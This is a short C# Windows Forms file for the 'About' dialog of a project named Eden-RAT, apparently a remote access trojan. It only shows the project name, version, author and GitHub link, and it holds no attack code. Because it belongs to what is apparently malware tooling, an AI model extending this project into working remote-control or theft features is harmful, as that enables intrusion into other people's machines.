using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmAbout : Form
    {
        public frmAbout()
        {
            InitializeComponent();

            Text = "About";
        }

        void fnSetup()
        {
            richTextBox1.Text = $"" +
                $"Project: Eden-RAT\n" +
                $"Version: 1.0.0\n" +
                $"Author: ISSAC\n" +
                $"Github: https://github.com/iss4cf0ng/Eden-RAT/\n" +
                $"Document: ";
        }

        private void frmAbout_Load(object sender, EventArgs e)
        {
            fnSetup();
        }
    }
}
